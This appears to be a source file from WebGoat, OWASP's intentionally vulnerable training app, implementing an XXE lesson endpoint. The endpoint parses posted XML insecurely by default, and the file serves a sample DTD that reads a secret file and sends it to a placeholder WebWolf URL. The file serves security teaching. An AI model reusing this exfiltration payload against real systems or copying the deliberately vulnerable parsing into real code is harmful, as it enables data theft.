/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.xxe;

import org.apache.commons.exec.OS;
import org.apache.commons.lang.exception.ExceptionUtils;
import org.owasp.webgoat.assignments.AssignmentEndpoint;
import org.owasp.webgoat.assignments.AssignmentHints;
import org.owasp.webgoat.assignments.AttackResult;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;

import static org.springframework.http.MediaType.ALL_VALUE;
import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;


/**
 * @author nbaars
 * @since 4/8/17.
 */
@RestController
@AssignmentHints({"xxe.hints.simple.xxe.1", "xxe.hints.simple.xxe.2", "xxe.hints.simple.xxe.3", "xxe.hints.simple.xxe.4", "xxe.hints.simple.xxe.5", "xxe.hints.simple.xxe.6"})
public class SimpleXXE extends AssignmentEndpoint {

    private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr", "etc", "var"};
    private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files", "pagefile.sys"};

    @Value("${webgoat.server.directory}")
    private String webGoatHomeDirectory;

    @Value("${webwolf.url.landingpage}")
    private String webWolfURL;


    @Autowired
    private Comments comments;

    @PostMapping(path = "xxe/simple", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
    @ResponseBody
    public AttackResult createNewComment(HttpServletRequest request, @RequestBody String commentStr) throws Exception {
        String error = "";
        try {
        	boolean secure = false;
        	if (null != request.getSession().getAttribute("applySecurity")) {
        		secure = true;
        	}
            Comment comment = comments.parseXml(commentStr, secure);
            System.err.println("Comment " + comment);
            comments.addComment(comment, false);
            if (checkSolution(comment)) {
                return success(this).build();
            }
        } catch (Exception e) {
            error = ExceptionUtils.getFullStackTrace(e);
        }
        return failed(this).output(error).build();
    }

    private boolean checkSolution(Comment comment) {
        String[] directoriesToCheck = OS.isFamilyMac() || OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;
        boolean success = false;
        for (String directory : directoriesToCheck) {
            success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(), directory);
        }
        return success;
    }

    @RequestMapping(path = "/xxe/tmpdir", consumes = ALL_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseBody
    public String getWebGoatHomeDirectory() {
        return webGoatHomeDirectory;
    }

    @RequestMapping(path = "/xxe/sampledtd", consumes = ALL_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
    @ResponseBody
    public String getSampleDTDFile() {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!ENTITY % file SYSTEM \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">\n"
                + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">\n"
                + "%all;";
    }
    
    @GetMapping(path="/xxe/applysecurity",produces=MediaType.TEXT_PLAIN_VALUE)
    @ResponseBody
    public String setSecurity(HttpServletRequest request) {
		
		String applySecurity = (String) request.getSession().getAttribute("applySecurity");
		if (applySecurity == null) {
			request.getSession().setAttribute("applySecurity", "true");
		}
		return "xxe security patch is now applied, you can try the previous challenges and see the effect!";
    }

}
